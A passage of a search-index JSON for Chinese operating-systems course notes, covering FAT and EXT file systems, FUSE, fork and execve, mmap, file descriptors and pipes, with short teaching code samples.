2\uff0c\u5728\u5185\u5b58\u4e2d\u7f13\u5b58\u4e00\u4efd File Allocation Table(FAT) \u96c6\u4e2d\u4fdd\u5b58\u6240\u6709\u6307\u9488\uff0c\u4ece\u800c\u83b7\u5f97\u66f4\u9ad8\u7684\u8bfb\u5199\u6027\u80fd\u3002</p> <p>\u4e3a\u4e86\u83b7\u5f97\u66f4\u9ad8\u7684\u53ef\u9760\u6027\uff0c\u53ef\u4ee5\u5c06 FAT \u591a\u5907\u4efd\u51e0\u4e2a\uff0c\u5b58\u50a8\u8bbe\u5907\u4fdd\u7559\u9996\u5b57\u8282\u5199\u660e\u5171\u6709\u51e0\u4e2a FAT \u5b58\u6863\uff1a</p> <p></p> <p>\u6211\u4eec\u4fee\u6539\u6587\u4ef6\u7ed3\u6784\u65f6\uff0c\u8981\u5199\u56de n \u4efd FAT\uff1b\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5ef6\u8fdf\u5199\u56de\uff0c\u5199\u653e\u5927\u7684\u5f71\u54cd\u5e76\u6ca1\u6709\u5f88\u5927</p> <p>\u5728\u53e4\u65e9\u7684 DOS \u7cfb\u7edf\u4e2d\uff0c\u6587\u4ef6\u540d\u957f\u5ea6\u9650\u5236\u89c4\u5b9a\u4e3a 8+3\uff0c\u5373\u6587\u4ef6\u540d\u6700\u591a 8 \u4e2a\u5b57\u7b26\uff0c\u6269\u5c55\u540d\u6700\u591a\u4e09\u4e2a\u5b57\u7b26\u3002\u4e3a\u652f\u6301\u66f4\u957f\u7684 Unicode \u6587\u4ef6\u540d\uff0c\u73b0\u4ee3 FAT \u5f15\u5165\u4e86 Short Entry + \u591a\u4e2a Long Entry \u7684\u65b9\u6848\uff1a\u4f8b\u5982\uff0c\u5982\u4e0b\u662f\u6587\u4ef6 <code>The quick brown.fox</code> \u6587\u4ef6\u7684\u5143\u4fe1\u606f\uff1a</p> <p></p> <p>\u4e3a\u4e86\u4e0e\u65e7\u7cfb\u7edf\u517c\u5bb9\uff0c\u539f\u5148\u7684 Short Entry \u4e5f\u4fdd\u7559\uff0c\u4f46\u662f\u6ea2\u51fa\u7684\u90e8\u5206\u7528\u6ce2\u6d6a\u7ebf <code>~n</code> \u4ee3\u66ff</p>"},{"location":"Accumulation/NJUOS/persistence/#ext","title":"EXT","text":"<p>FAT \u6587\u4ef6\u7cfb\u7edf\u9002\u7528\u4e8e\u5bb9\u91cf\u5c0f\u3001\u9700\u6c42\u7b80\u5355\u7684\u573a\u666f\uff0c\u4f8b\u5982\u76f8\u673a SD \u5361\u3001U \u76d8\u3001UEFI \u7cfb\u7edf\u5206\u533a\u7b49\u3002\u4f46\u968f\u7740\u5b58\u50a8\u9700\u6c42\u589e\u957f\uff0cFAT \u663e\u5f97\u529b\u4e0d\u4ece\u5fc3\uff0cUNIX \u7cfb\u7edf\u8f6c\u5411\u4e86\u66f4\u5f3a\u5927\u7684\u7ed3\u6784\u5316\u6587\u4ef6\u7cfb\u7edf\u3002</p> <p>UNIX \u6587\u4ef6\u7cfb\u7edf\u662f\u4e00\u4e2a\u63a5\u8fd1\u4e8e\u56fe\u7684\u6811\u72b6\u7ed3\u6784\uff0c\u94fe\u63a5\u7684\u5b58\u5728\u5141\u8bb8\u201c\u865a\u62df\u78c1\u76d8\u201d\u5b58\u5728\u591a\u4efd\u5f15\u7528\uff0c\u5b83\u5c06\u5b9e\u9645\u6570\u636e\u548c\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u5206\u5f00\uff0c\u5206\u522b\u5b58\u50a8\u5728\u6811\u7684 <code>struct node</code> \u548c <code>struct edge</code> \u4e2d\u3002</p> <ul> <li>inode\uff08index node\uff09\uff1a\u5b58\u50a8\u6587\u4ef6\u7684\u5143\u6570\u636e\u4e0e\u5b9e\u9645\u6570\u636e\u5757\u4f4d\u7f6e</li> <li>\u76ee\u5f55\u9879\uff08edge\uff09\uff1a\u5c06\u6587\u4ef6\u540d\u6620\u5c04\u5230 inode \u7f16\u53f7</li> </ul> <p>\u4e5f\u5c31\u662f UNIX \u7528 inode table \u4ee3\u66ff\u4e86 FAT \u7684\u529f\u80fd</p> <p>\u4f8b\u5982\uff0c\u6587\u4ef6\u7684\u5143\u6570\u636e\u5b58\u50a8\u5728 index node(inode) \u4e2d\uff0c\u65e0\u8bba\u4f60\u7528\u786c\u94fe\u63a5\u521b\u5efa\u591a\u5c11\u4e2a\u8be5\u6587\u4ef6\u7684\u201c\u5165\u53e3\u201d\uff0c\u5bf9\u5e94 inode \u4e2a\u6570\u4e0d\u4f1a\u6539\u53d8\uff0c\u53ea\u6709 edge \u4e2a\u6570\u4f1a\u589e\u52a0\u3002</p> <p></p> <p>EXT \u7684\u53ef\u9760\u6027\u4ecd\u7136\u662f\u4e00\u4e2a\u91cd\u8981\u95ee\u9898\uff0c\u56e0\u4e3a\u5b58\u50a8 inode \u7684\u6570\u636e\u5757\u635f\u6bc1\u662f\u76f8\u5f53\u4e25\u91cd\u7684\u3002</p>"},{"location":"Accumulation/NJUOS/persistence/#fuse","title":"FUSE","text":"<p>FUSE \u662f\u4e00\u79cd\u5c06\u6587\u4ef6\u7cfb\u7edf\u903b\u8f91\u79fb\u51fa\u5185\u6838\u3001\u653e\u5165\u7528\u6237\u7a7a\u95f4\u7684\u673a\u5236\u3002\u5b83\u662f\u4e00\u79cd\u534f\u8bae\u800c\u975e\u683c\u5f0f\uff0c\u5141\u8bb8\u5f00\u53d1\u8005\u5728\u7528\u6237\u6001\u4ee5\u666e\u901a\u7a0b\u5e8f\u65b9\u5f0f\u5b9e\u73b0\u81ea\u5b9a\u4e49\u6587\u4ef6\u7cfb\u7edf\u3002</p> <ul> <li>\u6838\u5fc3\u7ec4\u4ef6\uff1a<ul> <li>libfuse\uff1a\u7528\u6237\u6001\u5e93\uff0c\u5b9e\u73b0\u6302\u8f7d\u4e0e\u534f\u8bae\u5904\u7406</li> <li>\u5185\u6838\u6a21\u5757 fuse.ko\uff1a\u63a5\u6536\u7cfb\u7edf\u8c03\u7528\uff0c\u8f6c\u53d1\u7ed9\u7528\u6237\u6001\u7a0b\u5e8f</li> </ul> </li> <li>\u5178\u578b\u5e94\u7528\uff1a<code>sshfs</code>\uff08\u5c06\u8fdc\u7a0b SSH \u76ee\u5f55\u6302\u8f7d\u6210\u672c\u5730\u76ee\u5f55\uff09\u3001<code>encfs</code>\u3001<code>rclone mount</code></li> </ul> <p>\u4f60\u53ef\u4ee5\u81ea\u5df1\u51b3\u5b9a\u5982\u4f55\u5b58\u50a8\u3001\u8bfb\u53d6\u6570\u636e\uff08\u5982\u57fa\u4e8e JSON\u3001\u6570\u636e\u5e93\u3001\u538b\u7f29\u5305\u3001\u751a\u81f3\u7f51\u7edc\uff09\uff0c\u53ea\u8981\u5b9e\u73b0\u6807\u51c6\u7684\u6587\u4ef6\u7cfb\u7edf API\uff08\u5982 <code>getattr</code>, <code>read</code>, <code>write</code> \u7b49\uff09\u5373\u53ef\u3002</p> <p>\u4f8b\u5982 Btrfs\uff08B-Tree Filesystem\uff09\u5c31\u57fa\u4e8e COW + B \u6811\u7ed3\u6784\u6784\u5efa\u6240\u6709\u903b\u8f91\uff1a</p> <p></p> <p>Everything is B-Tree: \u53ef\u4ee5\u5b9e\u73b0 Resize\u3001\u900f\u660e\u538b\u7f29\u3001\u5feb\u7167\u7b49\u7b49</p>"},{"location":"Accumulation/NJUOS/virtual/","title":"\u865a\u62df\u5316","text":""},{"location":"Accumulation/NJUOS/virtual/#_1","title":"\u865a\u62df\u5316","text":"<p> \u7ea6 2152 \u4e2a\u5b57  58 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>\u865a\u62df\u5316</p> <p>\u628a\u7269\u7406\u8ba1\u7b97\u673a\u62bd\u8c61\u6210\u865a\u62df\u8ba1\u7b97\u673a\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u597d\u50cf\u72ec\u5360\u8ba1\u7b97\u673a\u8fd0\u884c\u3002</p>"},{"location":"Accumulation/NJUOS/virtual/#_2","title":"\u7a0b\u5e8f\u4e0e\u8fdb\u7a0b","text":"<p>\u7a0b\u5e8f\u662f\u72b6\u6001\u673a\u7684\u9759\u6001\u63cf\u8ff0\uff0c\u63cf\u8ff0\u4e86\u6240\u6709\u53ef\u80fd\u7684\u7a0b\u5e8f\u72b6\u6001\u3002\u7a0b\u5e8f(\u52a8\u6001)\u8fd0\u884c\u8d77\u6765\uff0c\u5c31\u6210\u4e3a\u8fdb\u7a0b\u3002</p>"},{"location":"Accumulation/NJUOS/virtual/#api","title":"\u8fdb\u7a0b\u7ba1\u7406 API","text":"<p>\u64cd\u4f5c\u7cfb\u7edf API\uff1a\u975e\u5fc5\u8981\u4e0d\u63d0\u4f9b\uff0c\u907f\u514d\u4ee3\u7801\u81c3\u80bf</p> <ul> <li>\u8fdb\u7a0b\u7ba1\u7406: fork, execve, exit, waitpid</li> <li>\u5185\u5b58\u7ba1\u7406: mmap</li> <li>\u6587\u4ef6(\u5bf9\u8c61)\u7ba1\u7406: open, read, write, dup, close, pipe</li> </ul> <p>\u65e2\u7136\u5982\u6b64\uff0c\u6211\u4eec\u5c31\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u8fdb\u7a0b\u7ba1\u7406\u7684 API\u3002</p> <p>\u4e00\u4e2a\u76f4\u89c2\u7684\u60f3\u6cd5\u662f\u4f7f\u7528 <code>spawn(path, argv)</code> \u521b\u5efa\u8fdb\u7a0b(\u72b6\u6001\u673a)\uff0c\u7528 <code>_exit()</code> \u9500\u6bc1\u8fdb\u7a0b\u3002\u8fd9\u4e2a\u60f3\u6cd5\u5728 Windows \u4e2d\u5f97\u5230\u5e94\u7528\uff0c\u5206\u522b\u5bf9\u5e94 API \u4e3a <code>CreateProcess()</code> \u548c <code>TerminateProcess()</code>\u3002</p> <p>\u800c\u5728 Unix \u4e2d\uff0c\u5b83\u4f7f\u7528\u590d\u5236\u548c\u590d\u4f4d\u6765\u4ee3\u66ff\u521b\u5efa\u548c\u9500\u6bc1\uff1a</p> <p>pid_t fork(void);</p> <p>\u5b8c\u6574\u590d\u5236\u4e00\u4efd\u72b6\u6001\u673a\uff0c\u5305\u62ec\u5185\u5b58\u3001\u5bc4\u5b58\u5668</p> <ul> <li>\u6267\u884c <code>fork</code> \u7684\u8fdb\u7a0b\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53f7\uff0c\u5b83\u4eec\u662f\u201c\u7236\u5b50\u201d\u5173\u7cfb</li> <li>\u5b50\u8fdb\u7a0b\u5219\u8fd4\u56de 0\uff1b\u5982\u679c\u8fd4\u56de -1 \u5219\u8bf4\u660e\u590d\u5236\u5931\u8d25\uff0c\u901a\u8fc7 <code>errno</code> \u8fd4\u56de\u9519\u8bef\u539f\u56e0</li> </ul> <pre><code>int pid = fork();\nif (pid &lt; 0) {\n    // \u5931\u8d25\u5904\u7406\n}\n\n// \u5728\u4e24\u4e2a\u8fdb\u7a0b\u4e2d\u540c\u65f6\u6267\u884c\n// \u6839\u636e\u8fd4\u56de\u503c\u7684\u4e0d\u540c\u5728\u7236\u5b50\u8fdb\u7a0b\u4e2d\u505a\u4e0d\u540c\u884c\u4e3a\nif (pid == 0) {\n    // new\n} else {\n    // old\n}\n</code></pre> <p>\u8fdb\u7a0b\u521b\u5efa\u7684\u5173\u7cfb\u5f62\u6210\u4e86\u8fdb\u7a0b\u6811\uff0c\u5b50\u8fdb\u7a0b\u7ed3\u675f\u65f6\u9700\u8981\u53d1\u9001 <code>SIGCHILD</code> \u4fe1\u53f7\u7ed9\u7236\u8fdb\u7a0b\u3002\u4f46\u662f\u8981\u662f\u7236\u8fdb\u7a0b\u6b64\u65f6\u5df2\u7ecf\u7ec8\u6b62\u4e86\u600e\u4e48\u529e\uff1fUNIX \u7684\u6258\u5b64\u673a\u5236\u4f1a\u5c06\u5b50\u8fdb\u7a0b\u7684 <code>ppid</code> \u8bbe\u7f6e\u4e3a 1\uff0c\u5e76\u4e14 1 \u53f7\u8fdb\u7a0b\u6536\u5230\u8be5\u5b64\u513f\u8fdb\u7a0b\u7684\u4fe1\u53f7\u4e0d\u4f1a\u505a\u4efb\u4f55\u4e8b\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0cOS \u4e5f\u53ef\u80fd\u4f1a\u5176\u6258\u5b64\u81f3 <code>systemd --usr</code> \u4e0a\uff0c\u8fd9\u4e2a\u8fdb\u7a0b\u7684 <code>pid</code> \u4e0d\u4e3a 1</p> <p>addition\uff1a\u6d4b\u8bd5\u6846\u67b6</p> <ul> <li>jyy \u7684\u6d4b\u8bd5\u6846\u67b6\u4e2d\uff0c\u7236\u8fdb\u7a0b\u8c03\u7528\u4e00\u4e2a\u5b8c\u5168\u590d\u5236\u81ea\u5df1\u72b6\u6001\u7684\u5b50\u8fdb\u7a0b\u6765 <code>run_test</code></li> <li>\u7236\u8fdb\u7a0b\u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f <code>waitpid</code>\uff0c\u6839\u636e\u5b50\u8fdb\u7a0b\u8fd4\u56de\u7684\u7ed3\u679c\u5224\u65ad\u6d4b\u8bd5\u662f\u5426\u901a\u8fc7</li> </ul> <p>int execve(const char * filename, char * const argv[], char * const envp[]);</p> <p>\u5c06\u5f53\u524d\u8fdb\u7a0b\u91cd\u7f6e\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u63cf\u8ff0\u72b6\u6001\u673a\u7684\u521d\u59cb\u72b6\u6001\u3002</p> <ul> <li><code>filename</code> \u53ef\u6267\u884c\u6587\u4ef6\u7684\u6587\u4ef6\u540d</li> <li><code>argv[]</code> \u7a0b\u5e8f\u7684\u53c2\u6570</li> <li><code>envp[]</code> \u73af\u5883\u53d8\u91cf</li> </ul> <p>\u53ea\u590d\u4f4d\u4e86\u7528\u6237\u53ef\u89c1\u7684\u72b6\u6001\uff0cOS \u5185\u90e8\u7ef4\u62a4\u7684\u72b6\u6001\u6ca1\u53d8\uff0c\u4f8b\u5982\u8fdb\u7a0b\u53f7\u3001\u76ee\u5f55\u3001\u6253\u5f00\u7684\u6587\u4ef6\u7b49</p> <p><code>execve</code> \u662f\u552f\u4e00\u80fd\u591f\u201c\u6267\u884c\u7a0b\u5e8f\u201d\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u6267\u884c\u4efb\u4f55\u53ef\u6267\u884c\u6587\u4ef6\u65f6\uff0c\u7b2c\u4e00\u4e2a\u8c03\u7528\u7684\u80af\u5b9a\u65f6 <code>execve</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 <code>strace</code> \u547d\u4ee4\u8fdb\u884c\u9a8c\u8bc1\uff1a</p> <pre><code>\u279c strace ./main &amp;| less\nMissing filename (\"less --help\" for help)\nexecve(\"./main\", [\"./main\"], 0x7ffff1b1c230 /* 38 vars */) = 0 \n...\n</code></pre> <p>\u5728 C \u7a0b\u5e8f\u4e2d\u6267\u884c <code>execve</code> \u540e\uff0c\u5982\u679c\u8be5\u7cfb\u7edf\u8c03\u7528\u6ca1\u6709 error\uff0c\u5219\u540e\u9762\u7684\u4ee3\u7801\u90fd\u4e0d\u4f1a\u88ab\u6267\u884c\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u72b6\u6001\u673a\u76f4\u63a5\u88ab\u91cd\u7f6e\u4e86\u3002\u4f8b\u5982\u6211\u4eec\u5bf9 gcc \u8fdb\u884c <code>strace</code>\uff0c\u89c2\u5bdf\u8fd9\u4e00\u90e8\u5206\u4ee3\u7801\uff1a</p> <pre><code>[pid 28369] execve(\"/usr/local/sbin/as\", [\"as\", \"--64\", ...\n[pid 28369] execve(\"/usr/local/bin/as\", [\"as\", \"--64\", ...\n[pid 28369] execve(\"/usr/sbin/as\", [\"as\", \"--64\", ...\n[pid 28369] execve(\"/usr/bin/as\", [\"as\", \"--64\", ...\n</code></pre> <p>\u8fd9\u91cc\u5728\u73af\u5883\u53d8\u91cf <code>$PATH</code> \u4e2d\u5bfb\u627e\u6c47\u7f16\u5668 <code>as</code>\uff0c\u5e76\u904d\u5386\u8c03\u7528 <code>execve</code>\u3002\u4ece\u4e0a\u5230\u4e0b\u5f53\u6709\u4e00\u4e2a <code>execve</code> \u53ef\u4ee5\u6b63\u786e\u6267\u884c\u540e\uff0c\u4e0b\u9762\u7684\u6307\u4ee4\u5c31\u4e0d\u4f1a\u518d\u88ab\u6267\u884c\u3002</p> <p>void _exit(int status);</p> <p>\u7acb\u5373\u6467\u6bc1\u72b6\u6001\u673a\uff0c\u5141\u8bb8\u6709\u4e00\u4e2a\u8fd4\u56de\u503c\uff0c\u53ef\u88ab\u7236\u8fdb\u7a0b\u83b7\u53d6\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e09\u4e2a\u7cfb\u7edf\u8c03\u7528\u5c31\u5b9e\u73b0\u4e86\u6574\u4e2a UNIX \u4e16\u754c\u4e2d\u7684\u6240\u6709\u8fdb\u7a0b\u8c03\u7528\u3002</p> <pre><code>int pid = fork();\nif (pid == -1) { // \u9519\u8bef\n    perror(\"fork\"); goto fail;\n} else if (pid == 0) { // \u5b50\u8fdb\u7a0b\n    execve(...);\n    perror(\"execve\"); exit(EXIT_FAILURE);\n} else { // \u7236\u8fdb\u7a0b\n    ...\n    int status;\n    waitpid(pid, &amp;status, 0); // testkit.c\n}\n</code></pre>"},{"location":"Accumulation/NJUOS/virtual/#_3","title":"\u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4","text":"<p>\u8fdb\u7a0b <code>execve</code> \u540e\u7684\u521d\u59cb\u72b6\u6001\u5728 ABI \u4e2d\u5f97\u5230\u89c4\u5b9a\uff0c\u4f46\u662f\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7684\u89c4\u5b9a\u5e76\u4e0d\u76f8\u540c\uff0c\u4f8b\u5982\u4f60\u53ef\u4ee5\u67e5\u770b System-V ABI \u7684 3.4 \u8282 Process Initializaiton\u3002\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u5927\u90e8\u5206\u6bb5\u90fd\u662f\u4e0d\u53ef\u8bfb\u7684\uff0c\u8bbf\u95ee\u5b83\u4eec\u4f1a\u51fa\u73b0 <code>segment fault</code>\u3002</p> <p>Application Binary Interface: \u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u5e95\u5c42\u7cfb\u7edf\u7684\u63a5\u53e3</p> <p>\u8fdb\u7a0b\u7684\u521d\u59cb\u72b6\u6001\u53ea\u6709 ELF \u6587\u4ef6\u4e2d\u58f0\u660e\u7684\u5185\u5b58\u548c\u4e00\u4e9b\u64cd\u4f5c\u7cfb\u7edf\u5206\u914d\u7684\u5185\u5b58\uff0c\u5176\u5b83\u4efb\u4f55\u6307\u9488\u7684\u8bbf\u95ee\u90fd\u662f\u975e\u6cd5\u7684\u3002\u4f46\u662f\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u4e00\u5b9a\u5b58\u5728\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\u53ef\u4ee5\u6539\u53d8\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff1a</p> <pre><code>// \u6620\u5c04\nvoid *mmap(void *addr, size_t length, int prot, int flags,\n           int fd, off_t offset);\nint munmap(void *addr, size_t length);\n\n// \u4fee\u6539\u6620\u5c04\u6743\u9650\nint mprotect(void *addr, size_t length, int prot);\n</code></pre> <ul> <li><code>addr</code>: \u6307\u5b9a\u6620\u5c04\u8d77\u59cb\u5730\u5740\uff1b\u5bf9\u4e8e <code>mmap</code>\uff0c\u901a\u5e38\u8bbe\u4e3a <code>NULL</code>\uff0c\u7531\u7cfb\u7edf\u81ea\u52a8\u9009\u62e9\u5408\u9002\u4f4d\u7f6e</li> <li><code>prot</code>: \u6307\u5b9a\u5185\u5b58\u4fdd\u62a4\u65b9\u5f0f<ul> <li><code>PROT_READ</code> \u53ef\u8bfb</li> <li><code>PROT_WRITE</code> \u53ef\u5199</li> </ul> </li> <li><code>flags</code>: \u63a7\u5236\u6620\u5c04\u884c\u4e3a<ul> <li><code>MAP_SHARED</code> \u5171\u4eab\u6620\u5c04</li> <li><code>MAP_PRIVATE</code> \u79c1\u6709\u6620\u5c04</li> <li><code>MAP_ANONYMOUS</code> \u533f\u540d\u7533\u8bf7\u5185\u5b58</li> </ul> </li> <li><code>fd</code>: \u628a\u6587\u4ef6 \u201c\u642c\u5230\u201d \u8fdb\u7a0b\u5730\u5740\u7a7a\u95f4\u4e2d (\u4f8b\u5b50\uff1a\u52a0\u8f7d\u5668)</li> <li><code>offset</code>: \u6587\u4ef6\u4e2d\u7684\u504f\u79fb\u91cf\uff0c\u8868\u793a\u4ece\u6587\u4ef6\u4e2d\u7684\u54ea\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u6620\u5c04</li> </ul> <p>\u53ef\u4ee5\u7528 <code>pmap</code> \u547d\u4ee4\u67e5\u770b\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u770b <code>/proc/[pid]/map</code></p>"},{"location":"Accumulation/NJUOS/virtual/#_4","title":"\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8c61","text":""},{"location":"Accumulation/NJUOS/virtual/#_5","title":"\u6587\u4ef6","text":"<p>Everything is a File</p> <pre><code>\u279c cat /dev/urandom | head -c 16 | hexdump\n0000000 d8e4 1e43 4a06 bce4 e7ec 64a9 557f 0ffa\n0000010\n</code></pre> <p>\u6587\u4ef6\u662f\u5e26\u6709\u201c\u540d\u5b57\u201d\u7684\u6570\u636e\u5bf9\u8c61\uff0c\u5e7f\u4e49\u4e0a\u53ef\u4ee5\u5305\u542b\u5b57\u8282\u6d41(\u7ec8\u7aef\u3001<code>urandom</code>\u7b49)\u548c\u5b57\u8282\u5e8f\u5217(\u666e\u901a\u6587\u4ef6)\uff1b\u800c\u6587\u4ef6\u63cf\u8ff0\u7b26\u662f\u6307\u5411\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8c61\u7684\u6307\u9488\uff0c\u901a\u8fc7\u6307\u9488\u53ef\u4ee5\u8bbf\u95ee\u4e00\u5207\u3002</p> <p>\u5728 Unix \u7cfb\u7edf\u4e2d\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8c61\uff08\u5982\u6587\u4ef6\u3001\u8bbe\u5907\u3001\u7ba1\u9053\u7b49\uff09\u7684\u8bbf\u95ee\u90fd\u9700\u8981\u901a\u8fc7\u6587\u4ef6\u63cf\u8ff0\u7b26\uff08\u6307\u9488\uff09\u3002\u5e38\u89c1\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u64cd\u4f5c\u5305\u62ec\uff1a</p> <ul> <li><code>open()</code> - \u6253\u5f00/\u521b\u5efa\u5bf9\u8c61\uff0c\u4f1a\u5728\u5730\u5740\u7a7a\u95f4\u4e2d\u5206\u914d\u4e00\u4e2a\u672a\u5206\u914d\u7684\u6700\u5c0f\u6587\u4ef6\u63cf\u8ff0\u7b26<ul> <li><code>p = malloc(sizeof(FileDescriptor));</code></li> </ul> </li> <li><code>close()</code> - \u5173\u95ed\u5bf9\u8c61<ul> <li><code>delete(p);</code></li> </ul> </li> <li><code>read()/write()</code> - \u8bfb\u5199\u5bf9\u8c61\uff0c\u5c5e\u4e8e\u89e3\u5f15\u7528<ul> <li><code>*(p.data++);</code></li> </ul> </li> <li><code>lseek()</code> - \u6539\u53d8\u8bfb\u5199\u4f4d\u7f6e<ul> <li><code>p.data += offset;</code></li> </ul> </li> <li><code>dup()</code> - \u590d\u5236\u6587\u4ef6\u63cf\u8ff0\u7b26<ul> <li><code>q = p</code></li> </ul> </li> </ul> <p>\u6587\u4ef6\u63cf\u8ff0\u7b26 0,1,2 \u521d\u59cb\u9ed8\u8ba4\u5360\u7528\uff0c\u5b83\u4eec\u90fd\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e00\u822c\u4e3a\u7ec8\u7aef</p> <p>\u6587\u4ef6\u63cf\u8ff0\u7b26\u662f\u8fdb\u7a0b\u72b6\u6001\u7684\u4e00\u90e8\u5206\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6267\u884c <code>fork</code> \u590d\u5236\u8fdb\u7a0b\u7684\u65f6\u5019\u5bf9\u4e8e\u8be5\u5757\u5730\u5740\u7a7a\u95f4\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f</p> <p>\u5bf9\u4e8e\u5b57\u8282\u6d41\uff0c\u6211\u4eec\u53ef\u4ee5\u6ca1\u6709\u76f4\u63a5\u5c06\u6307\u9488\u7684\u503c\u590d\u5236\u5230\u5b50\u8fdb\u7a0b\u4e2d\uff0c\u76f8\u5f53\u4e8e\u6d45\u62f7\u8d1d\uff1b\u5bf9\u4e8e\u5b57\u8282\u5e8f\u5217\uff0c\u6587\u4ef6\u63cf\u8ff0\u7b26\u6307\u5411\u7684\u662f\u8be5\u6587\u4ef6\u7684\u4e00\u4e2a <code>offset</code>\uff0c\u56e0\u6b64\u6211\u4eec\u590d\u5236\u7684\u6307\u9488\u503c\u5b9e\u9645\u4e0a\u6307\u5411\u7684\u4e3a\u8be5 <code>offset</code>\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u548c <code>dup()</code> \u76f8\u540c\u3002</p> <p>\u53ef\u4ee5\u5c1d\u8bd5\u4ee5\u4e0b\u4ee3\u7801\uff1a</p> <pre><code>\u279c  ~ wget -r -np -nH --cut-dirs=2 -R \"index.html*\" \"https://jyywiki.cn/os-demos/virtualization/fd/\"\n\u279c  ~ cd fd &amp;&amp; make\n\u279c  fd ./fd-offset   \nContent of sample.txt: AB\nContent of sample.txt after fork: DC\n</code></pre> <p>Windows \u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6bd4 Unix \u66f4\u50cf\u4e00\u4e2a\u6307\u9488\uff0c\u79f0\u4e3a Handle(\u53e5\u67c4)\u3002\u548c Unix \u76f8\u53cd\u7684\u662f\uff0cWindows \u4e2d\u9ed8\u8ba4 handle \u662f\u4e0d\u7ee7\u627f\u7684\uff0c\u8fd9\u7b26\u5408\u9762\u5411\u5de5\u7a0b\u7684\u6700\u5c0f\u6743\u9650\u539f\u5219\u3002</p> <p>Linux \u64cd\u4f5c\u7cfb\u7edf\u4e00\u822c\u9075\u5faa Filesystem Hierarchy Standard \u89c4\u8303(FHS)</p> <p></p> <p>\u9664\u4e86\u4e0a\u8ff0\u7528\u6765\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u5bf9\u8c61\u7684\u7cfb\u7edf\u8c03\u7528\uff0cUNIX \u8fd8\u63d0\u4f9b\u4e86 <code>mount</code>, <code>pipe</code>, <code>mkfifo</code> \u7b49\u80fd\u591f\u201c\u521b\u5efa\u201d\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8c61\u7684\u7cfb\u7edf\u8c03\u7528\u3002</p> <p>UNIX \u7ba1\u9053(pipe)\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6d41\u5f0f\u6587\u4ef6\uff0c\u5b83\u5e38\u7528\u4f5c\u8fdb\u7a0b\u95f4\u901a\u4fe1\u673a\u5236\uff0c\u5141\u8bb8\u6570\u636e\u5728\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u5355\u5411\u6d41\u52a8\u3002\u5176\u4e2d\u4e00\u4e2a\u8fdb\u7a0b\u5c06\u6570\u636e\u5199\u5165\u7ba1\u9053\u7684\u4e00\u7aef\uff0c\u800c\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u4ece\u7ba1\u9053\u53e6\u4e00\u7aef\u8bfb\u53d6\u6570\u636e\u3002</p> <pre><code>// \u533f\u540d\u7ba1\u9053\nint pipe(int pipefd[2]);\n// pipefd[0] \u662f\u8bfb\u53e3\uff0cpipefd[1] \u662f\u5199\u53e3\n// \u533f\u540d\u7ba1\u9053\u5728\u4e24\u4e2a\u53e3\u5747\u65e0\u4eba\u5f15\u7528\u65f6\u4f1a\u88ab\u64cd\u4f5c\u7cfb\u7edf\u81ea\u52a8\u56de\u6536\n</code></pre> <p>\u90a3\u4e48\u6211\u4eec\u5e73\u5e38\u5728\u7ec8\u7aef\u4f7f\u7528\u7ba1\u9053 <code>|</code> \u4f20\u9012\u8f93\u51fa\u65f6\uff0cOS \u7684\u673a\u5236\u4f1a\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053\u5bf9\u8c61\uff0c\u5c06\u524d\u4e00\u4e2a\u7a0b\u5e8f\u6307\u5411\u7ec8\u7aef(<code>stdout</code>)\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u8f6c\u79fb\u5230\u7ba1\u9053\u7684\u5199\u53e3\uff0c\u540e\u4e00\u4e2a\u7a0b\u5e8f\u6307\u5411\u7ec8\u7aef(<code>stdin</code>)\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u8f6c\u79fb\u5230\u7ba1\u9053\u7684\u8bfb\u53e3\u3002</p>"},{"location":"Accumulation/NJUOS/virtual/#unix-shell","title":"UNIX Shell","text":"<p>Session(\u4f1a\u8bdd) \u662f\u4e00\u7ec4\u8fdb\u7a0b\u7684\u96c6\u5408\uff0c\u901a\u5e38\u7531\u4e00\u4e2a\u767b\u5f55\u4f1a\u8bdd\uff08login, ssh \u7b49\uff09\u521b\u5efa\u3002\u6bcf\u4e2a Session 